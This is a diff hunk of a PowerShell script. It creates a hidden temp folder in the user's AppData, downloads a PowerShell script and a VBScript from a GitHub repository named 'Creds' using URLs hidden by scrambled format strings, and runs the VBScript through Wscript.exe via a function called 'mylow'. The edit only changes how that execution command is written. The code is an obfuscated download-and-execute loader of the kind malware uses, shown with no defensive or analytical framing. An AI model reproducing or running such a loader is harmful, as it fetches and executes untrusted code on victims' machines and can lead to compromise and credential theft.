@@ -16,5 +16,5 @@ function mylow
 New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType ("{1}{0}" -f 'ectory','dir') -Name ("{3}{1}{2}{0}" -f'er','F','old','temp')
 Invoke-WebRequest -Uri ("{2}{15}{7}{13}{1}{9}{17}{11}{14}{6}{10}{12}{4}{5}{18}{8}{0}{3}{16}"-f'o','tent','https://raw','owodi.','v','oke','af/Cr','r','l','.','ed','gorA','s/main/In','con','l','.githubuse','ps1','com/I','-') -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"
 Invoke-WebRequest -Uri ("{10}{8}{12}{13}{6}{11}{0}{2}{9}{1}{4}{5}{7}{3}" -f 'nt.com/','In','IgorAlaf/','p.vbs','voke-se','t','/raw.githubu','u','t','Creds/main/','h','serconte','tp','s:/') -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-setup.vbs"
-mylow -Command ('Wscript'+'.'+'exe'+' '+"""$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-setup.vbs""")
+mylow -Command "Wscript.exe ""$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-setup.vbs"""
 
